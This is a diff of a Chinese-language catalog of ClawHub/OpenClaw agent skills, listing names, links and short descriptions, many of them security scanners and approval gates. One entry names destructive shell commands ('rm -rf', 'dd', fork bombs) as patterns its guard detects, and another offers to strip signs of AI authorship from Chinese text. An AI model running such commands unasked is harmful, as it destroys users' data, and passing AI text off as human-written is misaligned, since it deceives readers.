+<td><a href="https://clawdhub.com/skills/secure-api-calls">ClawHub/secure-api-calls</a></td>
+<td>安全调用任意 API 且不泄露凭证。Keychains 代理请求并在服务端注入真实令牌，您的 Agent 绝不会接触这些令牌。</td>
+</tr>
+<tr>
+<td align="center">136</td>
+<td>Seisoai</td>
+<td>Seisoai 🔑</td>
+<td><a href="https://clawdhub.com/skills/seiso">ClawHub/seiso</a></td>
+<td>统一媒体生成网关，面向代理。动态发现工具，选择 API 密钥或 x402 认证，调用图像/视频/音频/音乐/3D/训练等工具。</td>
+</tr>
+<tr>
+<td align="center">137</td>
+<td>ez谷歌</td>
+<td>ez-google</td>
+<td><a href="https://clawdhub.com/skills/ez-google">ClawHub/ez-google</a></td>
+<td>用于处理Gmail、Google日历、云端硬盘、文档、表格、幻灯片或联系人的相关任务，包括发送/阅读邮件、查看/安排会议、创建活动、搜索文件、创建文档、读写表格、查找联系人等。支持托管OAuth，代理友好，无需API密钥。</td>
+</tr>
+<tr>
+<td align="center">138</td>
+<td>workspace审查</td>
+<td>Workspace Review</td>
+<td><a href="https://clawdhub.com/skills/workspace-review">ClawHub/workspace-review</a></td>
+<td>根据OpenClaw规范审计工作区结构和内存文件。在被要求&quot;审查工作区&quot;、&quot;审计文件&quot;、&quot;检查结构&quot;或进行周期性自我维护时使用。有助于发现偏离标准模式的问题。</td>
+</tr>
+<tr>
+<td align="center">139</td>
+<td>Kubernetes</td>
+<td>Kubernetes</td>
+<td><a href="https://clawdhub.com/skills/kubernetes-devops">ClawHub/kubernetes-devops</a></td>
+<td>功能：生成具备生产级安全与健康检查的 Kubernetes 清单，涵盖 Deployments、StatefulSets、CronJobs、Services、Ingresses、ConfigMaps、Secrets 及 PVC。 时机：用户需创建 K8s 清单、部署容器、配置服务与路由、管理配置与密钥、设置持久存储或多环境配置时。 关键词：kubernetes, k8s, 清单, deplo...</td>
+</tr>
+<tr>
+<td align="center">140</td>
+<td>wp多工具</td>
+<td>WP Multitool — WordPress Optimization Toolkit</td>
+<td><a href="https://clawdhub.com/skills/wp-multi-tool">ClawHub/wp-multi-tool</a></td>
+<td>WordPress 网站健康审计、性能优化、数据库清理、自动加载调优、慢查询检测、wp‑config 配置管理、图片尺寸控制、前端优化...</td>
+</tr>
+<tr>
+<td align="center">141</td>
+<td>百度baike</td>
+<td>baidu baike search 🔑</td>
+<td><a href="https://clawdhub.com/skills/baidu-baike">ClawHub/baidu-baike</a></td>
+<td>百度百科组件是一款知识服务工具，用于查询各类名词的权威百科解释。其核心功能是根据用户输入的特定名词（如人物、地点、概念等），返回来自百度百科的标准化详细词条释义。</td>
+</tr>
+<tr>
+<td align="center">142</td>
+<td>代理sentinel</td>
+<td>AgentSentinel Safety Layer 🔑</td>
+<td><a href="https://clawdhub.com/skills/agent-sentinel">ClawHub/agent-sentinel</a></td>
+<td>本地优先的预算与策略防护，可选同步至 AgentSentinel。</td>
+</tr>
+<tr>
+<td align="center">143</td>
+<td>Moltbot安全</td>
+<td>Moltbot Security</td>
+<td><a href="https://clawdhub.com/skills/moltbot-security">ClawHub/moltbot-security</a></td>
+<td>AI 代理安全加固 — Moltbot、OpenClaw、Cursor、Claude。锁定网关、修复权限、认证与防火墙。对 vibe-coding 环境至关重要。</td>
+</tr>
+<tr>
+<td align="center">144</td>
+<td>phone语音</td>
+<td>Phone Voice Integration 🔑</td>
+<td><a href="https://clawdhub.com/skills/phone-voice">ClawHub/phone-voice</a></td>
+<td>通过 Twilio 电话将 ElevenLabs Agents 连接至 OpenClaw。支持来电显示认证、语音 PIN 安全、呼叫筛选、记忆注入及成本追踪。</td>
+</tr>
+<tr>
+<td align="center">145</td>
+<td>OAuth助手</td>
+<td>Oauth Helper</td>
+<td><a href="https://clawdhub.com/skills/oauth-helper">ClawHub/oauth-helper</a></td>
+<td>{&quot;answer&quot;:&quot;通过 Telegram 用户确认自动化 OAuth 登录流程。支持 7 种提供商：Google、Apple、Microsoft、GitHub、Discord、微信、QQ。\n\n功能：\n- 自动检测登录页可用的 OAuth 选项\n- 多选项时通过 Telegram 让用户选择\n- 授权前进行确认\n- 自动处理账号选择和同意页面&quot;}</td>
+</tr>
+<tr>
+<td align="center">146</td>
+<td>arc安全</td>
+<td>Arc Security - Agent Trust Protocol 🔑</td>
+<td><a href="https://clawdhub.com/skills/arc-security">ClawHub/arc-security</a></td>
+<td>通过质押 USDC 债券管理技能信任，为已验证技能支付微费，举报恶意技能，并参与去中心化治理</td>
+</tr>
+<tr>
+<td align="center">147</td>
+<td>AGENTICAIGOLDSTANDARD</td>
+<td>AGENTIC AI GOLD STANDARD</td>
+<td><a href="https://clawdhub.com/skills/agentic-ai-gold">ClawHub/agentic-ai-gold</a></td>
+<td>{   &quot;answer&quot;: &quot;唯一在您睡眠时自我进化的智能体框架。具备17道法性安全关卡、四级韧性与超25万token的2026年研究成果的自进化AI基础设施。&quot; }</td>
+</tr>
+<tr>
+<td align="center">148</td>
+<td>技能auditor</td>
+<td>Skill Auditor</td>
+<td><a href="https://clawdhub.com/skills/skill-auditor">ClawHub/skill-auditor</a></td>
+<td>安全扫描器，可在恶意技能窃取数据前将其拦截。能检测凭证盗窃、提示注入和隐藏后门。无需配置，即开即用。可选AST数据流分析可追踪代码中的数据流向。</td>
+</tr>
+<tr>
+<td align="center">149</td>
+<td>内容id指南</td>
+<td>Content Id Guide</td>
+<td><a href="https://clawdhub.com/skills/content-id-guide">ClawHub/content-id-guide</a></td>
+<td>帮助创作者从容理解并整理跨平台的自动化内容版权主张，确保不遗漏重要信息。</td>
+</tr>
+<tr>
+<td align="center">150</td>
+<td>安全技能扫描器</td>
+<td>Security Skill Scanner 🔑</td>
+<td><a href="https://clawdhub.com/skills/security-skill-scanner">ClawHub/security-skill-scanner</a></td>
+<td>在安装前扫描 OpenClaw 技能包中的安全漏洞和可疑模式</td>
+</tr>
+<tr>
+<td align="center">151</td>
+<td>Otp Challenger</td>
+<td>Otp Challenger 🔑</td>
+<td><a href="https://clawdhub.com/skills/otp-challenger">ClawHub/otp-challenger</a></td>
+<td>使代理和技能在执行敏感操作前能够要求用户进行双重认证（TOTP 或 YubiKey）。适用于审批流程中的身份验证，例如部署命令、财务操作、数据访问、管理操作和变更控制。</td>
+</tr>
+<tr>
+<td align="center">152</td>
+<td>Clawshell</td>
+<td>Clawshell 🔑</td>
+<td><a href="https://clawdhub.com/skills/clawshell">ClawHub/clawshell</a></td>
+<td>人在回路安全层，拦截高风险命令并要求推送通知审批。</td>
+</tr>
+<tr>
+<td align="center">153</td>
+<td>sophie优化器</td>
+<td>Sophie Optimizer</td>
+<td><a href="https://clawdhub.com/skills/sophie-optimizer">ClawHub/sophie-optimizer</a></td>
+<td>OpenClaw 自动上下文健康管理：监控令牌使用、快照内存并重置会话以保持性能。作者：Sophie。</td>
+</tr>
+<tr>
+<td align="center">154</td>
+<td>zh人性化</td>
+<td>Chinese Humanizer</td>
+<td><a href="https://clawdhub.com/skills/zh-humanizer">ClawHub/zh-humanizer</a></td>
+<td>去除AI写作痕迹，使文本读起来像真人作者自然撰写，主要针对中文语境。</td>
+</tr>
+<tr>
+<td align="center">155</td>
+<td>安全</td>
+<td>AgentGuard</td>
+<td><a href="https://clawdhub.com/skills/security">ClawHub/security</a></td>
+<td>GoPlus AgentGuard — AI 代理安全守护。运行 /agentguard checkup 进行完整安全健康检查，扫描全部已安装技能，检查凭证、权限...</td>
+</tr>
+<tr>
+<td align="center">156</td>
+<td>Dropbox管理器</td>
+<td>Dropbox Manager 🔑</td>
+<td><a href="https://clawdhub.com/skills/dropbox">ClawHub/dropbox</a></td>
+<td>通过 CLI 或 MCP 服务器，利用 OAuth 2.0 PKCE 安全管理 Dropbox 文件，支持上传、下载、搜索、删除及账户信息查询。</td>
+</tr>
+<tr>
+<td align="center">157</td>
+<td>审计代码</td>
+<td>Audit Code</td>
+<td><a href="https://clawdhub.com/skills/audit-code">ClawHub/audit-code</a></td>
+<td>安全导向的代码审查，涵盖硬编码密钥、危险调用和常见漏洞</td>
+</tr>
+<tr>
+<td align="center">158</td>
+<td>Spotify History</td>
+<td>Spotify History 🔑</td>
+<td><a href="https://clawdhub.com/skills/spotify-history">ClawHub/spotify-history</a></td>
+<td>通过Spotify Web API访问收听历史、热门艺人/曲目，并获取个性化推荐。适用于获取用户近期播放、分析音乐品味或生成推荐。需一次性OAuth设置。</td>
+</tr>
+<tr>
+<td align="center">159</td>
+<td>indirect提示词注入</td>
+<td>Indirect Prompt Injection Defense</td>
+<td><a href="https://clawdhub.com/skills/indirect-prompt-injection">ClawHub/indirect-prompt-injection</a></td>
+<td>读取社交媒体、文档、网页等外部内容时，检测并防御间接提示注入攻击。需在处理任何不可信内容前使用，识别劫持目标、窃取数据、覆盖指令或进行社会工程操纵的企图，包含20多种检测模式、同形字检测及清洗脚本。</td>
+</tr>
+<tr>
+<td align="center">160</td>
+<td>Just Fucking Cancel</td>
+<td>Just Fucking Cancel</td>
+<td><a href="https://clawdhub.com/skills/just-fucking-cancel">ClawHub/just-fucking-cancel</a></td>
+<td>通过分析银行交易查找并取消不需要的订阅。检测经常性费用，计算年度浪费，并提供取消链接。支持CSV分析，ClawdBot用户可选Plaid集成。</td>
+</tr>
+<tr>
+<td align="center">161</td>
+<td>Moltchan</td>
+<td>Moltchan 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltchan">ClawHub/moltchan</a></td>
+<td>面向 AI 代理的图像板（类 4chan），采用与 Moltbook 相同的认证，支持板块、主题、图片发布、回复和点赞。</td>
+</tr>
+<tr>
+<td align="center">162</td>
+<td>lead生成website</td>
+<td>Lead Gen Website Builder (SEO PUR)</td>
+<td><a href="https://clawdhub.com/skills/lead-gen-website">ClawHub/lead-gen-website</a></td>
+<td>构建具备SEO优化、转化追踪及RGPD合规功能的完整本地潜在客户开发网站。适用于创建针对本地市场（如水管工、电工、家政服务等）的服务型网站，包含10-20个页面、结构化数据、分析功能及法律合规性。</td>
+</tr>
+<tr>
+<td align="center">163</td>
+<td>ansible技能</td>
+<td>Ansible</td>
+<td><a href="https://clawdhub.com/skills/ansible-skill">ClawHub/ansible-skill</a></td>
+<td>使用Ansible实现基础设施自动化，涵盖服务器配置、配置管理、应用部署及多主机编排。包含OpenClaw VPS初始化、安全加固与常见服务器配置的Playbook。</td>
+</tr>
+<tr>
+<td align="center">164</td>
+<td>量化交易信号</td>
+<td>量化交易信号</td>
+<td><a href="https://clawdhub.com/skills/quant-trading-signals">ClawHub/quant-trading-signals</a></td>
+<td>量化交易信号系统。基于MACD、RSI、KDJ、均线、布林带等技术指标生成买卖信号。支持港股、美股、加密货币。</td>
+</tr>
+<tr>
+<td align="center">165</td>
+<td>sona安全审计</td>
+<td>Security Audit (Sona)</td>
+<td><a href="https://clawdhub.com/skills/sona-security-audit">ClawHub/sona-security-audit</a></td>
+<td>{&quot;answer&quot;:&quot;OpenClaw/ClawHub技能与仓库的故障关断安全审计：启用或安装前须进行trufflehog密钥扫描、semgrep SAST、提示注入/持久化检测及供应链卫生检查。&quot;}</td>
+</tr>
+<tr>
+<td align="center">166</td>
+<td>MoltThreats</td>
+<td>MoltThreats 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltthreats">ClawHub/moltthreats</a></td>
+<td>由 PromptIntel 提供的原生代理安全信号源。适用于报告威胁、获取防护信息、应用安全规则或更新 SHIELD.md。涉及威胁报告、安全订阅源、MCP 威胁、恶意技能、提示注入报告、IOC、代理安全、PromptIntel、MoltThreats、SHIELD.md 更新等关键词时触发。当代理在运行中检测到可疑行为（如异常工具调用、凭证访问尝试、未知 MCP 服务器、数据渗漏模式）时亦触发。</td>
+</tr>
+<tr>
+<td align="center">167</td>
+<td>Keep Protocol</td>
+<td>Keep Protocol</td>
+<td><a href="https://clawdhub.com/skills/keep-protocol">ClawHub/keep-protocol</a></td>
+<td>基于TCP签名Protobuf数据包的AI智能体通信协议。现集成MCP工具实现亚秒级延迟！轻量级ed25519认证协议，支持发现、路由及内存共享。</td>
+</tr>
+<tr>
+<td align="center">168</td>
+<td>Domain Details</td>
+<td>Domain Details</td>
+<td><a href="https://clawdhub.com/skills/domaindetails">ClawHub/domaindetails</a></td>
+<td>查询域名 WHOIS/RDAP 信息，查看市场挂售信息。免费 API，无需认证。</td>
+</tr>
+<tr>
+<td align="center">169</td>
+<td>飞书common</td>
+<td>Feishu Common 🔑</td>
+<td><a href="https://clawdhub.com/skills/feishu-common">ClawHub/feishu-common</a></td>
+<td>提供共享飞书认证、租户令牌缓存、重试处理和针对依赖飞书技能的身份验证 API 请求支持。</td>
+</tr>
+<tr>
+<td align="center">170</td>
+<td>Bags</td>
+<td>Bags 🔑</td>
+<td><a href="https://clawdhub.com/skills/bags">ClawHub/bags</a></td>
+<td>Bags - 面向人类和 AI 代理的 Solana 启动板。支持认证、钱包管理、费用领取、代币交易，以及为自己、其他代理 or 人类启动代币。</td>
+</tr>
+<tr>
+<td align="center">171</td>
+<td>xiaoding技能审核</td>
+<td>Skill Vetter</td>
+<td><a href="https://clawdhub.com/skills/xiaoding-skill-vetter">ClawHub/xiaoding-skill-vetter</a></td>
+<td>安全优先的AI智能体技能审查。在安装任何来自ClawdHub、GitHub或其他来源的技能前进行检查，识别危险信号和权限范围。</td>
+</tr>
+<tr>
+<td align="center">172</td>
+<td>Safe Exec 0.3.2</td>
+<td>Safe Exec 0.3.2</td>
+<td><a href="https://clawdhub.com/skills/safe-exec-0-3-2">ClawHub/safe-exec-0-3-2</a></td>
+<td>为 OpenClaw Agents 提供安全的命令执行功能，具备自动危险模式检测、风险评估、用户审批流程及审计日志。适用于代理需执行危险 Shell 命令（如 rm -rf、dd、fork 炸弹、系统目录修改）或需人工监督的场景。提供多级风险评估（严重/高/中/低）、会话通知、请求管理及非交互式环境支持。</td>
+</tr>
+<tr>
+<td align="center">173</td>
+<td>EdgeOne ClawScan</td>
+<td>EdgeOne ClawScan</td>
+<td><a href="https://clawdhub.com/skills/edgeone-clawscan">ClawHub/edgeone-clawscan</a></td>
+<td>OpenClaw 配置完成后首选的安全技能，由腾讯朱雀实验室提供。如同 AI 环境的杀毒软件：审计安装……</td>
+</tr>
+<tr>
+<td align="center">174</td>
+<td>quack代码审查</td>
+<td>Code Review</td>
+<td><a href="https://clawdhub.com/skills/quack-code-review">ClawHub/quack-code-review</a></td>
+<td>AI驱动的代码分析——通过LogicArt发现漏洞、安全问题并生成逻辑流可视化。适用于代码审查、质量分析等场景...</td>
+</tr>
+<tr>
+<td align="center">175</td>
+<td>API凭据清理</td>
+<td>API credentials hygiene</td>
+<td><a href="https://clawdhub.com/skills/api-credentials-hygiene">ClawHub/api-credentials-hygiene</a></td>
+<td>审计并强化 API 凭证处理（环境变量、分离、轮换计划、最小权限、可审计性）。适用于集成服务或准备生产部署时需安全管理密钥的场景。</td>
+</tr>
+<tr>
+<td align="center">176</td>
+<td>Clauditor</td>
+<td>Clauditor</td>
+<td><a href="https://clawdhub.com/skills/clauditor">ClawHub/clauditor</a></td>
+<td>Clawdbot代理的防篡改审计监视器，利用HMAC链式证据检测并记录可疑文件系统活动。</td>
+</tr>
+<tr>
+<td align="center">177</td>
+<td>ecap安全auditor</td>
+<td>ecap Security Auditor 🔑</td>
+<td><a href="https://clawdhub.com/skills/ecap-security-auditor">ClawHub/ecap-security-auditor</a></td>
+<td>面向AI智能体技能、MCP服务器及包的安全审计框架。由你的LLM执行分析，我们提供结构、提示词与共享信任库。</td>
+</tr>
+<tr>
+<td align="center">178</td>
+<td>BrickLink</td>
+<td>BrickLink 🔑</td>
+<td><a href="https://clawdhub.com/skills/bricklink">ClawHub/bricklink</a></td>
+<td>BrickLink 商店 API 助手/CLI（OAuth1.0 请求签名），支持订单、店铺库存（读取+写入）、商品目录、分类、颜色、反馈及推送通知等功能。</td>
+</tr>
+<tr>
+<td align="center">179</td>
+<td>智能router</td>
+<td>A.I. Smart Router 🔑</td>
+<td><a href="https://clawdhub.com/skills/smart-router">ClawHub/smart-router</a></td>
+<td>具备语义领域评分、上下文溢出防护及安全脱敏功能的专家级模型路由器。依据加权专家评分（2026年2月基准）自动选择最佳AI模型，支持Claude、GPT、Gemini、Grok，包含自动回退链、人机交互把关及成本优化。</td>
+</tr>
+<tr>
+<td align="center">180</td>
+<td>API生成器</td>
+<td>Api Generator</td>
+<td><a href="https://clawdhub.com/skills/api-generator">ClawHub/api-generator</a></td>
+<td>API代码生成器。生成RESTful端点、GraphQL架构、OpenAPI/Swagger文档、API客户端、模拟服务器，并支持身份验证与速率限制。</td>
+</tr>
+<tr>
+<td align="center">181</td>
+<td>Backlink Analyzer</td>
+<td>Backlink Analyzer</td>
+<td><a href="https://clawdhub.com/skills/backlink-analyzer">ClawHub/backlink-analyzer</a></td>
+<td>用于分析外链概况、链接权威性、毒链、链接建设机会及竞争对手链接差距。</td>
+</tr>
+<tr>
+<td align="center">182</td>
+<td>fail2ban Reporter</td>
+<td>fail2ban Reporter 🔑</td>
+<td><a href="https://clawdhub.com/skills/fail2ban-reporter">ClawHub/fail2ban-reporter</a></td>
+<td>自动将fail2ban封禁的IP上报至AbuseIPDB并通过Telegram通知。用于监控服务器安全、上报攻击者或查看封禁IP。监控fail2ban新封禁并上报AbuseIPDB，同时发送警报。</td>
+</tr>
+<tr>
+<td align="center">183</td>
+<td>System Architect</td>
+<td>System Architect</td>
+<td><a href="https://clawdhub.com/skills/system-architect">ClawHub/system-architect</a></td>
+<td>充当高级系统架构师，设计健壮、可扩展且易于维护的软件架构。遵循行业标准（Python 的 PEP 8、JS/TS 的 ESLint），采用模块化设计并落实安全最佳实践。适用于用户想启动新项目、重构现有项目或讨论高层系统设计时。</td>
+</tr>
+<tr>
+<td align="center">184</td>
+<td>SendGrid</td>
+<td>SendGrid 🔑</td>
+<td><a href="https://clawdhub.com/skills/sendgrid">ClawHub/sendgrid</a></td>
+<td>SendGrid API integration with managed OAuth. Send emails, manage contacts, templates, suppressions, and view email statistics. Use this skill when users want...</td>
+</tr>
+<tr>
+<td align="center">185</td>
+<td>测试specialist</td>
+<td>Test Specialist</td>
+<td><a href="https://clawdhub.com/skills/test-specialist">ClawHub/test-specialist</a></td>
+<td>该技能适用于JavaScript/TypeScript应用的测试用例编写、Bug修复、代码问题分析及测试覆盖率提升。涵盖单元测试、集成测试、端到端测试，以及运行时错误、逻辑Bug、性能问题、安全漏洞的调试和系统性代码分析。</td>
+</tr>
+<tr>
+<td align="center">186</td>
+<td>Feast - Intelligent meal planning, region and season aware shopping lists, respects dietary requirements, provides recipes, and generates immersive mealtime playlists</td>
+<td>Feast - Intelligent meal planning, region and season aware shopping lists, respects dietary requirements, provides recipes, and generates immersive mealtime playlists</td>
+<td><a href="https://clawdhub.com/skills/feast">ClawHub/feast</a></td>
+<td>集文化主题、地道食谱、智能购物与惊喜揭秘于一体的全方位膳食规划系统。适用于规划每周菜单、生成购物清单、寻求烹饪灵感、回顾过往饮食、新用户引导、探索美食文化、追踪营养目标以及管理膳食历史记录。</td>
+</tr>
+<tr>
+<td align="center">187</td>
+<td>Gws Shared</td>
+<td>Gws Shared</td>
+<td><a href="https://clawdhub.com/skills/gws-shared">ClawHub/gws-shared</a></td>
+<td>gws CLI：身份验证、全局参数和输出格式的通用模式。</td>
+</tr>
+<tr>
+<td align="center">188</td>
+<td>Spotify Player</td>
+<td>Spotify Player 🔑</td>
+<td><a href="https://clawdhub.com/skills/spotify-linux">ClawHub/spotify-linux</a></td>
+<td>适用于无头Linux服务器的Spotify命令行工具。通过终端和Cookie认证控制播放，无需OAuth回调。完美适配无图形界面的远程服务器。</td>
+</tr>
+<tr>
+<td align="center">189</td>
+<td>技能安全审计</td>
+<td>claw skill security audit</td>
+<td><a href="https://clawdhub.com/skills/skill-security-audit">ClawHub/skill-security-audit</a></td>
+<td>对代码库进行全面的安全审计和漏洞分析。适用于明确要求安全分析、代码安全审查、漏洞评估、SAST扫描或识别源代码安全问题的场景。涵盖注入漏洞、访问控制缺陷、硬编码密钥、不安全的数据处理、身份验证弱点、LLM安全及隐私泄露。</td>
+</tr>
+<tr>
+<td align="center">190</td>
+<td>agentic安全审计</td>
+<td>Agentic Security Audit</td>
+<td><a href="https://clawdhub.com/skills/agentic-security-audit">ClawHub/agentic-security-audit</a></td>
+<td>审计代码库、基础设施和代理AI系统的安全问题。涵盖传统安全（依赖项、密钥、OWASP Web Top 10、SSL/TLS、f...）</td>
+</tr>
+<tr>
+<td align="center">191</td>
+<td>authensor网关</td>
+<td>Authensor Gateway 🔑</td>
+<td><a href="https://clawdhub.com/skills/authensor-gateway">ClawHub/authensor-gateway</a></td>
+<td>OpenClaw市场技能的故障安全策略网关。在执行前拦截工具调用并根据Authensor策略进行检查：低风险操作自动运行，高风险操作需批准，危险操作直接拦截。仅发送操作元数据至控制平面，绝不涉及文件、API密钥或对话内容。</td>
+</tr>
+<tr>
+<td align="center">192</td>
+<td>MoltsheetSpreadsheetsforAI代理</td>
+<td>Moltsheet - Spreadsheets for AI agents 🔑</td>
+<td><a href="https://clawdhub.com/skills/moltsheet">ClawHub/moltsheet</a></td>
+<td>使用 Moltsheet CLI 管理 AI 工作流中的电子表格数据：创建工作表、检查模式、导入行、更新单元格、共享工作表以及运行读取操作。</td>
+</tr>
+<tr>
+<td align="center">193</td>
+<td>ClawGuard</td>
+<td>ClawGuard</td>
+<td><a href="https://clawdhub.com/skills/clawguard">ClawHub/clawguard</a></td>
+<td>安装与配置ClawGuard安全插件——基于LLM即裁判的护栏，用于检测并拦截风险工具调用。</td>
+</tr>
+<tr>
+<td align="center">194</td>
+<td>OpenClaw技能安全检查器</td>
+<td>Security Skill Scanner</td>
+<td><a href="https://clawdhub.com/skills/openclaw-skills-security-checker">ClawHub/openclaw-skills-security-checker</a></td>
+<td>ClawdHub技能安全扫描器 - 检测可疑模式，管理白名单，并监控Moltbook安全威胁。</td>
+</tr>
+<tr>
+<td align="center">195</td>
+<td>OpenClawHardener</td>
+<td>OpenClaw Hardener</td>
+<td><a href="https://clawdhub.com/skills/openclaw-hardener">ClawHub/openclaw-hardener</a></td>
+<td>加固 OpenClaw（workspace 与 ~/.openclaw）：执行安全审计，拦截提示注入与数据窃取风险，扫描敏感信息并应用安全修复（如 chmod/执行位清理）。可选包含旨在缩减攻击面的 config.patch 规划。</td>
+</tr>
+<tr>
+<td align="center">196</td>
+<td>XFollowingsDigest</td>
+<td>X Followings Digest 🔑</td>
+<td><a href="https://clawdhub.com/skills/x-followings-digest">ClawHub/x-followings-digest</a></td>
+<td>Auto-fetch latest tweets from your X/Twitter followings and generate structured AI digest. Supports custom time ranges: 1 day, 3 days, 7 days, or custom.  自动抓取X/Twitter关注列表的最新推文，并使用AI分析师提示词生成结构化日报。...</td>
+</tr>
+<tr>
+<td align="center">197</td>
+<td>技能evaluator</td>
+<td>Skill Evaluator</td>
+<td><a href="https://clawdhub.com/skills/skill-evaluator">ClawHub/skill-evaluator</a></td>
+<td>利用多框架标准（ISO 25010、OpenSSF、Shneiderman 及智能体启发式规则）评估 Clawdbot 技能的质量、可靠性和发布就绪度。适用于发布前的审查、审计、评估或技能质量检查。功能包括运行自动化结构检查并指导涵盖 25 项标准的人工评估。</td>
+</tr>
+<tr>
+<td align="center">198</td>
+<td>Insecure Defaults Detection</td>
+<td>Insecure Defaults Detection</td>
+<td><a href="https://clawdhub.com/skills/insecure-defaults">ClawHub/insecure-defaults</a></td>
+<td>检测失败打开的不安全默认设置（硬编码密钥、弱认证、宽松安全配置），这些设置会导致应用在生产环境中不安全运行。适用于安全审计、配置管理审查或环境变量处理分析。</td>
+</tr>
+<tr>
+<td align="center">199</td>
+<td>Garmin Connect</td>
+<td>Garmin Connect</td>
+<td><a href="https://clawdhub.com/skills/garmin-connect">ClawHub/garmin-connect</a></td>
+<td>{&quot;answer&quot;:&quot;Clawdbot集成Garmin Connect：使用OAuth每5分钟同步健身数据（步数、心率、卡路里、运动、睡眠）。&quot;}</td>
+</tr>
+<tr>
+<td align="center">200</td>
+<td>加密投资组合追踪器</td>
+<td>Crypto Portfolio Tracker</td>
+<td><a href="https://clawdhub.com/skills/crypto-portfolio-tracker">ClawHub/crypto-portfolio-tracker</a></td>
+<td>加密貨幣Portfolio追蹤 - 支援TRON/ETH/BSC，分析持倉、收益、Gas費用</td>
+</tr>
+</tbody>
+</table>
 
-### 🎮 娱乐与游戏
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| 恐怖之夜游戏 | [Clawdbot/banshee-s-last-cry](https://clawdhub.com/skills/banshee-s-last-cry) | 恐怖惊魂夜 - 互动式恐怖悬疑得分杀游戏。玩家将在雪山旅馆中经历一场惊心动魄的生存冒险，通过调查线索、做出选择来推动剧情发展。支持多结局、角色扮演、线索系统。适用于互动小说、悬疑得分、文字冒险游戏等场景。 |
-| 问道笔录游戏 | [Clawdbot/cultivation-chronicle-cn](https://clawdhub.com/skills/cultivation-chronicle-cn) | 笔画录 - 修仙文字冒险游戏。玩家从凡人开始修炼，经历炼气、筑基、金丹、元婴、化神、渡、飞升七大大关，通过选择修炼道心，最终成就修仙之路。支持转世传承、角色成长、物品系统。适用于修仙题材、角色扮演、文字冒险等场景。 |
-| Last.fm 音乐统计 | [Clawdbot/lastfm](https://clawdhub.com/skills/lastfm) | 访问 Last.fm 收听历史记录、音乐统计数据和发现。查询最近的曲目、顶级艺术家/专辑/曲目、喜爱的曲目、类似的艺术家和全球排行榜。 |
-| Spotify 播放控制 | [Clawdbot/spotify](https://clawdhub.com/skills/spotify) | 控制 macOS 上的 Spotify 播放。播放/暂停、跳过曲目、控制音量、播放艺术家/专辑/播放列表。当用户要求播放音乐、控制 Spotify、更改歌曲或调整 Spotify 音量时使用。 |
-| Spotify | [Clawdbot/spotify-cli](https://clawdhub.com/skills/spotify-cli) | （无） |
+---
 
-### 🧩 其他
-| 技能名称 | 官方链接 | 核心功能 |
-|-----------|------------|----------------------|
-| A股分时量能分析 | [Clawdbot/a-stock-analysis](https://clawdhub.com/skills/a-stock-analysis) | （无） |
-| AgentBus 中继聊天 | [Clawdbot/agentbus-relay-chat](https://clawdhub.com/skills/agentbus-relay-chat) | （无） |
-| AnyList 购物清单 | [Clawdbot/anylist](https://clawdhub.com/skills/anylist) | 通过 AnyList 管理杂货和购物清单。当用户询问购物清单、杂货或添加/核对要购买的物品时使用。 |
-| Apple Reminders 提醒 | [Clawdbot/apple-remind-me](https://clawdhub.com/skills/apple-remind-me) | 创建实际 Apple Reminders.app 条目的自然语言提醒（macOS 原生） |
-| Apple TV 控制 | [Clawdbot/appletv](https://clawdhub.com/skills/appletv) | 通过 pyatv 控制 Apple TV。用于播放/暂停、导航、音量、启动应用程序、电源控制以及检查正在播放的内容。在“Apple TV”、“电视”、“正在播放的内容”、“暂停电视”、“播放电视”、“关闭电视”上触发。 |
-| Asana 项目管理 | [Clawdbot/asana-pat](https://clawdhub.com/skills/asana-pat) | （无） |
-| 归因引擎 | [Clawdbot/attribution-engine](https://clawdhub.com/skills/attribution-engine) | 帮助创作者以平台理解的方式清楚地信任合作者、工具和合作伙伴。在内容上线之前减少混乱、遗漏披露和可避免的问题。 |
-| 基础技能 | [Clawdbot/base-skill](https://clawdhub.com/skills/base-skill) | （无） |
-| Beanstalk 网关 | [Clawdbot/beanstalk-gateway](https://clawdhub.com/skills/beanstalk-gateway) | （无） |
-| BLE → $ANIMA Minter | [Clawdbot/ble-anima-minter](https://clawdhub.com/skills/ble-anima-minter) | （无） |
-| BluOS CLI | [Clawdbot/blucli](https://clawdhub.com/skills/blucli) | BluOS CLI (blu) 用于发现、播放、分组和音量。 |
-| CAD 代理 | [Clawdbot/cad-agent](https://clawdhub.com/skills/cad-agent) | （无） |
-| 摄像头快照 | [Clawdbot/camsnap](https://clawdhub.com/skills/camsnap) | 从 RTSP/ONVIF 摄像机捕获帧或剪辑。 |
-| Canvas LMS 学习管理 | [Clawdbot/canvas-lms](https://clawdhub.com/skills/canvas-lms) | 访问 Canvas LMS（Instruction）以获取课程数据、作业、成绩和提交内容。在检查截止日期、查看成绩、列出课程或从 Canvas 获取课程材料时使用。 |
-| Clawdbot 发布检查 | [Clawdbot/clawdbot-release-check](https://clawdhub.com/skills/clawdbot-release-check) | 检查新的crawdbot 版本并在每个新版本时通知一次。 |
-| OpenClaw Agent 创建向导 | [Clawdbot/create-openclaw-agent](https://clawdhub.com/skills/create-openclaw-agent) | 一键创建完整配置的 OpenClaw agent，包括身份定义、团队集成、模型与通信渠道设置，支持交互式和命令行两种配置模式。 |
-| 编码代理用户规则 | [Clawdbot/coding-agent-user-rules](https://clawdhub.com/skills/coding-agent-user-rules) | 错误发布，不知道如何取消发布;( |
-| ComfyUI 运行器 | [Clawdbot/comfyui-runner](https://clawdhub.com/skills/comfyui-runner) | ComfyUI 实例的启动/停止/状态。 |
-| CORS 配置生成器 | [Clawdbot/cors-config-gen](https://clawdhub.com/skills/cors-config-gen) | 为您的堆栈生成 CORS 配置。当跨源请求被阻止时使用。 |
-| CORS 配置生成器 | [Clawdbot/cors-gen](https://clawdhub.com/skills/cors-gen) | 为您的堆栈生成 CORS 配置。当跨源请求被阻止时使用。 |
-| 内容创建 | [Clawdbot/create-content](https://clawdhub.com/skills/create-content) | 将想法转化为平台优化内容的思想合作伙伴 |
-| 设计资产 | [Clawdbot/design-assets](https://clawdhub.com/skills/design-assets) | （无） |
-| Dilbert 漫画 | [Clawdbot/dilbert](https://clawdhub.com/skills/dilbert) | （无） |
-| Discord 语音备忘录升级 | [Clawdbot/discord-voice-memo-upgrade](https://clawdhub.com/skills/discord-voice-memo-upgrade) | （无） |
